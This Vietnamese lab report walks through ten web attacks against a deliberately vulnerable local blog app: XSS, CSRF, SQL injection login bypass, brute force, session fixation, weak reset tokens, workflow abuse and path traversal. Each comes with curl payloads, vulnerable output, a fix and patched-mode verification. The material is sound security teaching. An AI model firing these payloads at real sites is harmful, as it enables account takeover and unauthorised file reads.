# Mười kịch bản tấn công web

Tài liệu này ghi lại cách tái hiện, kết quả quan sát và biện pháp phòng thủ cho mười kịch bản tấn công web. Các kịch bản chỉ được thực hiện trên ứng dụng lab chạy tại `localhost` hoặc mạng lab riêng.

## 1. Quy ước chung

Đặt các biến sau trong shell:

```bash
BASE=http://localhost:8080
JAR=/tmp/atud-cookie.txt
```

Khi kiểm chứng song song hai cấu hình, nhóm chạy thêm một tiến trình ở cổng `8081` cho cấu hình đã vá. Trong Docker Compose, chỉ cần đổi `APP_MODE` trong `.env`, tạo lại dịch vụ `app` và dùng chung cổng `8080`.

Hàm đăng nhập có lấy mã CSRF. Cấu hình có lỗi bỏ qua mã này; cấu hình đã vá kiểm tra mã:

```bash
html="$(curl -sS -c "$JAR" "$BASE/login")"
token="$(printf '%s' "$html" | sed -n 's/.*name="_csrf" value="\([^"]*\)".*/\1/p' | head -1)"
curl -sS -b "$JAR" -c "$JAR" \
  --data-urlencode "username=bien" \
  --data-urlencode "password=Bien@Lab#2026" \
  --data-urlencode "_csrf=$token" \
  -o /dev/null -w '%{http_code}\n' "$BASE/login"
```

Mã trạng thái `302` sau đăng nhập cho biết yêu cầu thành công và chuyển hướng. Mã `403` cho biết kiểm soát phía máy chủ đã từ chối.

## 2. W1 - Stored XSS

### Căn cứ

Chương 2, mục 2.1.2.1. Dữ liệu do người dùng gửi được lưu vào cơ sở dữ liệu và hiển thị lại mà không được mã hóa.

### Chuẩn bị

Đăng nhập bằng `bien`. Bài viết `id=1` đã xuất bản và cho phép bình luận.

### Thực hiện

```bash
# Lấy mã CSRF của biểu mẫu bình luận
curl -sS -b "$JAR" -c "$JAR" "$BASE/post?id=1" -o /tmp/post.html
token="$(sed -n 's/.*name="_csrf" value="\([^"]*\)".*/\1/p' /tmp/post.html | head -1)"

# Gửi bình luận chứa mã script
curl -sS -b "$JAR" -c "$JAR" \
  --data-urlencode "post_id=1" \
  --data-urlencode "body=<script>alert('stored-demo')</script>" \
  --data-urlencode "_csrf=$token" \
  -o /dev/null -w '%{http_code}\n' "$BASE/comment"

# Mở lại bài viết
curl -sS "$BASE/post?id=1" | grep -n "stored-demo"
```

### Kết quả ở cấu hình có lỗi

```text
302
... <script>alert('stored-demo')</script> ...
```

Mã script nằm nguyên trong HTML trả về. Khi mở bài viết bằng trình duyệt, hộp thoại `stored-demo` xuất hiện. Đoạn mã nằm trong `app/views/post.php`; cấu hình có lỗi in trực tiếp `$comment['body']`.

### Biện pháp

Mã hóa đầu ra theo ngữ cảnh HTML bằng `htmlspecialchars` với `ENT_QUOTES` và `ENT_SUBSTITUTE`. Trong mã nguồn, cấu hình đã vá dùng `nl2br(e($comment['body']))`. CSP `script-src 'self'` là lớp bổ sung, không thay thế mã hóa đầu ra.

### Kiểm chứng ở cấu hình đã vá

Gửi lại cùng nội dung với mã CSRF hợp lệ:

```bash
curl -sS "$BASE/post?id=1" | grep -n "stored-demo"
```

Kết quả:

```text
... &lt;script&gt;alert(&#039;stored-demo&#039;)&lt;/script&gt; ...
```

Trình duyệt hiển thị chuỗi văn bản, không thực thi mã. Mã trạng thái gửi bình luận là `302`.

### Đặt lại

```bash
docker compose down -v
docker compose up -d --build
```

## 3. W2 - Reflected XSS

### Căn cứ

Chương 2, mục 2.1.2.2. Dữ liệu từ tham số yêu cầu được phản hồi ngay trong trang kết quả.

### Thực hiện

```bash
PAYLOAD="<script>alert('reflected-demo')</script>"
curl -sS -G --data-urlencode "q=$PAYLOAD" "$BASE/search" | grep -n "reflected-demo"
```

### Kết quả ở cấu hình có lỗi

```text
... <h2 class="search-summary">Kết quả cho: <script>alert('reflected-demo')</script></h2> ...
```

Mã script nằm trong thẻ `h2`. Trình duyệt thực thi ngay khi tải trang. Nguyên nhân là `app/views/search.php` in `$q` trực tiếp ở cấu hình có lỗi.

### Biện pháp

Mã hóa từ khóa khi hiển thị, giới hạn độ dài từ khóa ở cấu hình đã vá và không đưa dữ liệu yêu cầu vào HTML thô.

### Kiểm chứng ở cấu hình đã vá

```bash
curl -sS -G --data-urlencode "q=$PAYLOAD" "$BASE/search" | grep -n "search-summary"
```

Kết quả:

```text
... <h2 class="search-summary">Kết quả cho: &lt;script&gt;alert(&#039;reflected-demo&#039;)&lt;/script&gt;</h2> ...
```

Script không thực thi. Với từ khóa dài 5000 ký tự, cấu hình đã vá trả về `400`; cấu hình có lỗi trả về `200`.

## 4. W3 - DOM-based XSS

### Căn cứ

Chương 2, mục 2.1.2.3. Mã JavaScript phía trình duyệt đọc dữ liệu không tin cậy từ URL và ghi vào một điểm nguy hiểm của DOM.

### Thực hiện

Mở trình duyệt tại:

```text
http://localhost:8080/demo/dom?q=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27dom-demo%27%29%3E
```

Kiểm tra tệp JavaScript được nạp:

```bash
curl -sS "$BASE/demo/dom" | grep -o 'dom-[a-z]*\.js'
curl -sS "$BASE/assets/dom-vulnerable.js"
```

### Kết quả ở cấu hình có lỗi

```text
dom-vulnerable.js
output.innerHTML = '<p><strong>Giá trị nhận được:</strong> ' + value + '</p>';
```

Trình duyệt tạo thẻ `img`, gán `src=x`, sự kiện `onerror` kích hoạt và hiện hộp thoại `dom-demo`. Máy chủ không tham gia vào bước này; toàn bộ quá trình diễn ra trong DOM.

### Biện pháp

Dùng `textContent` thay cho `innerHTML` khi chỉ cần hiển thị văn bản. Không đưa dữ liệu từ `location.search` vào API HTML.

### Kiểm chứng ở cấu hình đã vá

```bash
curl -sS "$BASE/demo/dom" | grep -o 'dom-[a-z]*\.js'
curl -sS "$BASE/assets/dom-fixed.js"
```

Kết quả:

```text
dom-fixed.js
output.textContent = 'Giá trị nhận được: ' + value;
```

Cùng URL thử nghiệm, trình duyệt hiển thị chuỗi ký tự thay vì tạo phần tử ảnh. CSP không can thiệp vào phép gán `textContent`.

## 5. W4 - CSRF đổi email

### Căn cứ

Chương 2, mục 2.2. Ứng dụng thay đổi trạng thái dựa trên cookie phiên nhưng không kiểm tra mã chống CSRF.

### Chuẩn bị

Đăng nhập `bien` tại `http://localhost:8080`. Mở trang mô phỏng của kẻ tấn công tại `http://localhost:8088/`.

Trang này chạy ở cổng khác nhưng cùng site `localhost`; trình duyệt vẫn gửi cookie phiên cho yêu cầu POST. Đây là điểm cần phân biệt giữa same-origin và same-site.

### Thực hiện bằng trình duyệt

1. Đăng nhập ứng dụng.
2. Mở `http://localhost:8088/`.
3. Nhập email mới và bấm gửi.
4. Quay lại `http://localhost:8080/account`.

### Thực hiện bằng curl

```bash
curl -sS -b "$JAR" -c "$JAR" \
  --data-urlencode "email=attacker@gocnho.example" \
  -o /dev/null -w '%{http_code}\n' "$BASE/account/email"

curl -sS -b "$JAR" "$BASE/account" | grep -o 'value="[^"]*@gocnho.example"'
```

### Kết quả ở cấu hình có lỗi

```text
302
value="attacker@gocnho.example"
```

Yêu cầu không có trường `_csrf` vẫn được chấp nhận. Trong cơ sở dữ liệu, email của `bien` đổi thành `attacker@gocnho.example`.

### Biện pháp

Sinh mã CSRF theo phiên, gắn vào biểu mẫu và kiểm tra ở máy chủ bằng `hash_equals`. Đặt cookie phiên `SameSite=Strict` và `HttpOnly` để giảm nguy cơ gửi cookie từ site khác. Trong lab, hai cổng cùng site nên lớp quyết định là mã CSRF, không phải `SameSite`.

### Kiểm chứng ở cấu hình đã vá

```bash
curl -sS -b "$JAR" -c "$JAR" \
  --data-urlencode "email=attacker@gocnho.example" \
  -o /dev/null -w '%{http_code}\n' "$BASE/account/email"
```

Kết quả:

```text
403
```

Trang lỗi ghi: `Mã xác thực biểu mẫu không hợp lệ hoặc đã hết hiệu lực.` Email trong trang tài khoản vẫn là `bien@gocnho.example`. Gửi lại biểu mẫu có mã CSRF hợp lệ thì cập nhật thành công.

### Đặt lại

Đổi lại email bằng giao diện hoặc đặt lại toàn bộ dữ liệu.

## 6. W5 - SQL Injection trong đăng nhập

### Căn cứ

Chương 2, mục 2.3. Cấu hình có lỗi ghép trực tiếp tên đăng nhập và mật khẩu vào câu lệnh SQL.

### Thực hiện

```bash
html="$(curl -sS -c "$JAR" "$BASE/login")"
token="$(printf '%s' "$html" | sed -n 's/.*name="_csrf" value="\([^"]*\)".*/\1/p' | head -1)"

curl -sS -i -b "$JAR" -c "$JAR" \
  --data-urlencode "username=' OR '1'='1' -- " \
  --data-urlencode "password=khong-quan-trong" \
  --data-urlencode "_csrf=$token" \
  "$BASE/login"
```

Chuỗi `username` kết thúc bằng `-- ` để phần còn lại của điều kiện bị chú thích. Dấu cách sau `--` là bắt buộc trong MySQL.

### Kết quả ở cấu hình có lỗi

```text
HTTP/1.1 302 Found
Location: /admin
```

Ứng dụng đăng nhập bằng tài khoản quản trị đầu tiên trong bảng `users`.

### Biện pháp

Dùng PDO với truy vấn tham số hóa, không ghép chuỗi. Kiểm tra mật khẩu bằng `password_verify` với bcrypt. Không hiển thị lỗi SQL cho người dùng.

### Kiểm chứng ở cấu hình đã vá

Gửi lại cùng đầu vào:

```text
HTTP/1.1 200 OK
Tên đăng nhập hoặc mật khẩu không đúng.
```

Không có chuyển hướng tới `/admin`, không có thông báo SQL. Truy vấn tham số hóa coi toàn bộ chuỗi là giá trị của cột `username`, không phải mệnh đề SQL.

## 7. W6 - Vét cạn mật khẩu

### Căn cứ

Chương 2, mục 2.4.2.2. Cơ chế đăng nhập không giới hạn số lần thử.

### Thực hiện

```bash
html="$(curl -sS -c "$JAR" "$BASE/login")"
token="$(printf '%s' "$html" | sed -n 's/.*name="_csrf" value="\([^"]*\)".*/\1/p' | head -1)"

for i in 1 2 3 4 5; do
  curl -sS -b "$JAR" -c "$JAR" \
    --data-urlencode "username=minh" \
    --data-urlencode "password=sai-$i" \
    --data-urlencode "_csrf=$token" \
    -o /dev/null -w "lần $i: %{http_code}\n" "$BASE/login"
done

curl -sS -b "$JAR" -c "$JAR" \
  --data-urlencode "username=minh" \
  --data-urlencode "password=Minh@Lab#2026" \
  --data-urlencode "_csrf=$token" \
  -o /dev/null -w 'đăng nhập đúng: %{http_code}\n' "$BASE/login"
```

### Kết quả ở cấu hình có lỗi

```text
lần 1: 200
lần 2: 200
lần 3: 200
lần 4: 200
lần 5: 200
đăng nhập đúng: 302
```

Không có giới hạn. Mỗi lần sai chỉ trả về thông báo chung, nhưng người tấn công có thể tiếp tục với số lượng lớn.

### Biện pháp

Đếm số lần thất bại theo tên đăng nhập và địa chỉ nguồn trong cửa sổ 15 phút. Sau 5 lần, từ chối mọi yêu cầu đăng nhập trong 15 phút, kể cả khi mật khẩu đúng. Ghi nhật ký sự kiện khóa tài khoản.

### Kiểm chứng ở cấu hình đã vá

```text
lần 1: 200
lần 2: 200
lần 3: 200
lần 4: 200
lần 5: 200
đăng nhập đúng: 429
```

Thông báo: `Tài khoản hoặc địa chỉ mạng đang tạm khóa do quá nhiều lần đăng nhập thất bại. Thử lại sau 15 phút.` Cơ chế đếm nằm ở `app/src/Core/LoginThrottle.php`.

### Đặt lại

```bash
docker compose down -v
docker compose up -d --build
```

Trong lúc trình diễn, có thể xóa bản ghi thử nghiệm:

```bash
bash scripts/mysql-app.sh -e "DELETE FROM login_attempts;"
```

## 8. W7 - Cố định và phát lại mã phiên

### Căn cứ

Chương 2, mục 2.4.2.1 và Chương 3, mục 3.2.2. Mã phiên không được đổi sau khi xác thực và không bị thu hồi khi đăng xuất.

### Thực hiện

Chọn một mã phiên cố định:

```bash
SID=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

Mở trang đăng nhập và đăng nhập với mã phiên này:

```bash
curl -sS -i -c "$JAR" -H "Cookie: ATUDBLOG_SID=$SID" "$BASE/login" -o /tmp/step1.txt
token="$(sed -n 's/.*name="_csrf" value="\([^"]*\)".*/\1/p' /tmp/step1.txt | head -1)"

curl -sS -i -b "$JAR" -c "$JAR" -H "Cookie: ATUDBLOG_SID=$SID" \
  --data-urlencode "username=minh" \
  --data-urlencode "password=Minh@Lab#2026" \
  --data-urlencode "_csrf=$token" \
  "$BASE/login" -o /tmp/step2.txt

grep -i '^Set-Cookie:' /tmp/step2.txt
```

Kiểm tra phát lại trước và sau đăng xuất:

```bash
curl -sS -H "Cookie: ATUDBLOG_SID=$SID" "$BASE/account" -o /dev/null -w 'trước đăng xuất: %{http_code}\n'
curl -sS -H "Cookie: ATUDBLOG_SID=$SID" "$BASE/logout" -o /dev/null -w 'đăng xuất: %{http_code}\n'
curl -sS -H "Cookie: ATUDBLOG_SID=$SID" "$BASE/account" -o /dev/null -w 'sau đăng xuất: %{http_code}\n'
```

### Kết quả ở cấu hình có lỗi

```text
Không có Set-Cookie sau đăng nhập
trước đăng xuất: 200
đăng xuất: 302
sau đăng xuất: 200
```

Mã phiên do kẻ tấn công chọn vẫn được giữ sau đăng nhập. Đăng xuất chỉ xóa cookie ở trình duyệt hiện tại, không hủy phiên phía máy chủ. Một hồ sơ trình duyệt khác sao chép cookie cũ vẫn truy cập được trang tài khoản.

### Biện pháp

Đặt `session.use_strict_mode=1`, đổi mã phiên sau đăng nhập bằng `session_regenerate_id(true)`, hủy toàn bộ dữ liệu phiên và cookie khi đăng xuất. Đặt cookie `HttpOnly`, `SameSite=Strict`. Cờ cookie giảm nguy cơ lộ mã nhưng không tự thu hồi một mã đang còn hiệu lực; cần hủy phiên ở máy chủ.

### Kiểm chứng ở cấu hình đã vá

```text
HTTP/1.1 302 Found
Set-Cookie: ATUDBLOG_SID=<mã mới>; path=/; HttpOnly; SameSite=Strict
trước đăng xuất: 200
đăng xuất: 302
sau đăng xuất: 302
```

Mã cố định ban đầu bị từ chối. Sau đăng nhập, mã phiên đổi. Sau đăng xuất, mã cũ không còn truy cập được. Cấu hình đã vá còn kiểm tra `used_at`, `expires_at` và trạng thái phiên ở mỗi yêu cầu.

## 9. W8 - Mã đặt lại mật khẩu yếu

### Căn cứ

Chương 2, mục 2.4.2.4. Mã đặt lại mật khẩu dễ đoán, không hết hạn hoặc dùng lại được.

### Thực hiện ở cấu hình có lỗi

```bash
html="$(curl -sS -c "$JAR" "$BASE/forgot")"
token="$(printf '%s' "$html" | sed -n 's/.*name="_csrf" value="\([^"]*\)".*/\1/p' | head -1)"

curl -sS -b "$JAR" -c "$JAR" \
  --data-urlencode "email=ngoc@gocnho.example" \
  --data-urlencode "_csrf=$token" \
  "$BASE/forgot" | grep -o '/reset?token=[^"]*'
```

Kết quả:

```text
/reset?token=18ddf59c073c2b049a9a
```

Mã được tạo bằng công thức:

```bash
docker compose exec -T app php -r "echo substr(md5('ngoc|' . date('Y-m-d')), 0, 20), PHP_EOL;"
```

Kết quả trùng với mã trong liên kết. Mã có 20 ký tự hex, không đủ không gian tìm kiếm và có thể tính lại khi biết tên tài khoản cùng ngày.

Đặt lại mật khẩu lần một, sau đó mở lại đúng liên kết cũ:

```bash
curl -sS -b "$JAR" "$BASE/reset?token=18ddf59c073c2b049a9a" -o /dev/null -w '%{http_code}\n'
```

Kết quả:

```text
200
```

Biểu mẫu vẫn hiển thị và mã vẫn dùng được. Cấu hình có lỗi không kiểm tra `used_at`, không thu hồi mã cũ và không giới hạn thời gian đủ chặt.

### Biện pháp

Sinh mã bằng `random_bytes(32)`, lưu băm SHA-256 thay vì mã rõ, đặt hạn 30 phút, đánh dấu đã dùng trong cùng giao dịch với cập nhật mật khẩu, thu hồi các mã cũ. Trả về cùng một thông báo cho email tồn tại và không tồn tại.

### Kiểm chứng ở cấu hình đã vá

Liên kết được ghi vào nhật ký thư của lab:

```bash
docker compose exec -T app tail -n 1 storage/logs/mail.log
```

Kết quả có dạng:

```text
[2026-11-01T20:28:37+07:00] to=<email> link=http://localhost:8080/reset?token=<64 ký tự hex>
```

Sau lần đặt lại đầu tiên, mở lại liên kết:

```text
Liên kết đặt lại không hợp lệ, đã hết hạn hoặc đã được sử dụng.
```

Gửi lại biểu mẫu với mã cũ cũng bị từ chối. Mã hết hạn sau 30 phút và mỗi tài khoản chỉ có một mã hiệu lực.

### Đặt lại

Đặt lại toàn bộ dữ liệu để trả mật khẩu lab về mặc định.

## 10. W9 - Lạm dụng quy trình xuất bản

### Căn cứ

Chương 2, mục 2.5.2.1. Ứng dụng tin tưởng trường trạng thái do máy khách gửi và không kiểm tra vai trò, chủ sở hữu hay thứ tự nghiệp vụ.

### Chuẩn bị

Bài viết `id=5` của `lan` đang ở trạng thái `draft`. Tài khoản `lan` có vai trò độc giả, được tạo bản nháp nhưng không được tự xuất bản.

### Thực hiện

```bash
# Đăng nhập tài khoản độc giả
html="$(curl -sS -c "$JAR" "$BASE/login")"
token="$(printf '%s' "$html" | sed -n 's/.*name="_csrf" value="\([^"]*\)".*/\1/p' | head -1)"
curl -sS -b "$JAR" -c "$JAR" \
  --data-urlencode "username=lan" \
  --data-urlencode "password=Lan@Lab#2026" \
  --data-urlencode "_csrf=$token" \
  -o /dev/null "$BASE/login"

curl -sS -b "$JAR" -c "$JAR" "$BASE/editor/edit?id=5" -o /tmp/edit.html
token="$(sed -n 's/.*name="_csrf" value="\([^"]*\)".*/\1/p' /tmp/edit.html | head -1)"

curl -sS -b "$JAR" -c "$JAR" \
  --data-urlencode "id=5" \
  --data-urlencode "title=Ghi chu ky thuat ve quy trinh xuat ban" \
  --data-urlencode "summary=Ban nhap" \
  --data-urlencode "body=Noi dung bai viet nhap du dai de kiem tra quy trinh." \
  --data-urlencode "status=published" \
  --data-urlencode "_csrf=$token" \
  -o /dev/null -w '%{http_code}\n' "$BASE/editor/save"
```

### Kết quả ở cấu hình có lỗi

```text
302
```

Kiểm tra trạng thái:

```bash
bash scripts/mysql-app.sh -N -e "SELECT status FROM posts WHERE id=5;"
```

Kết quả:

```text
published
```

Tài khoản độc giả tự xuất bản bài nháp, bỏ qua bước gửi duyệt và bước kiểm tra của quản trị viên.

### Biện pháp

Máy chủ kiểm tra vai trò, chủ sở hữu, trạng thái hiện tại và trạng thái đích. Độc giả chỉ được đặt `draft` hoặc `pending`; tác giả được xuất bản bài của mình; quản trị viên được xuất bản mọi bài. Trạng thái `published` chỉ được chấp nhận từ bài đang `pending` thông qua endpoint quản trị.

### Kiểm chứng ở cấu hình đã vá

```text
403
Trạng thái không được phép
```

Trạng thái trong cơ sở dữ liệu vẫn là `draft`. Quy trình hợp lệ: người dùng gửi `pending`, quản trị viên mở `/admin` và bấm xuất bản.

### Đặt lại

```bash
bash scripts/mysql-app.sh -e "UPDATE posts SET status='draft' WHERE id=5;"
```

## 11. W10 - Duyệt đường dẫn khi tải tệp

### Căn cứ

Chương 3, mục 3.1.3.2. Ứng dụng nhận đường dẫn do người dùng kiểm soát và ghép vào thư mục lưu tệp mà không chuẩn hóa.

### Chuẩn bị

Tệp mồi `app/storage/private/demo-secret.txt` nằm ngoài thư mục công khai. Tệp công khai `id=2` là ảnh mẫu.

### Thực hiện

```bash
curl -sS "$BASE/download?file=../private/demo-secret.txt" -w '\n%{http_code}\n'
```

### Kết quả ở cấu hình có lỗi

```text
NOI_DUNG_NOI_BO=chi-dung-cho-kiem-thu-duong-dan
GHI_CHU=tep-moi-khong-duoc-phep-truy-cap-tu-ben-ngoai
200
```

Tham số `file` được ghép trực tiếp vào `UPLOAD_PATH`, nên `../` thoát khỏi thư mục tải lên và đọc được tệp riêng.

### Biện pháp

Chỉ nhận mã tệp số. Tra cứu tên tệp đã lưu trong cơ sở dữ liệu, dùng `basename`, `realpath` và kiểm tra tiền tố thư mục trước khi đọc. Kiểm tra quyền công khai, chủ sở hữu hoặc quản trị viên. Tệp lưu ngoài thư mục gốc của máy chủ web.

### Kiểm chứng ở cấu hình đã vá

```text
HTTP/1.1 400 Bad Request
Chức năng tải tệp chỉ nhận mã tệp hợp lệ, không nhận đường dẫn.
```

Tệp công khai vẫn tải được:

```bash
curl -sS -o /dev/null -w '%{http_code} %{size_download}\n' "$BASE/download?id=2"
```

Kết quả:

```text
200 24853
```

Tệp riêng của người khác trả về `403`; tệp không tồn tại trả về `404`.

## 12. Tổng hợp kết quả

| Mã | Bản có lỗi | Bản đã vá |
|---|---|---|
| W1 | Script lưu và thực thi | Chuỗi được mã hóa, không thực thi |
| W2 | Script phản hồi và thực thi | Chuỗi được mã hóa |
| W3 | `innerHTML` tạo phần tử từ URL | `textContent` chỉ hiển thị văn bản |
| W4 | Yêu cầu không mã CSRF được chấp nhận | `403`, email không đổi |
| W5 | `302` tới `/admin` | `200`, từ chối đăng nhập |
| W6 | Không giới hạn | `429` sau 5 lần sai |
| W7 | Mã phiên cố định, còn hiệu lực sau đăng xuất | Mã đổi, phiên cũ bị từ chối |
| W8 | Mã dễ đoán, dùng lại được | Mã ngẫu nhiên, một lần, hết hạn |
| W9 | Tự xuất bản thành công | `403`, giữ `draft` |
| W10 | Đọc được tệp riêng | `400`, tệp công khai vẫn tải được |
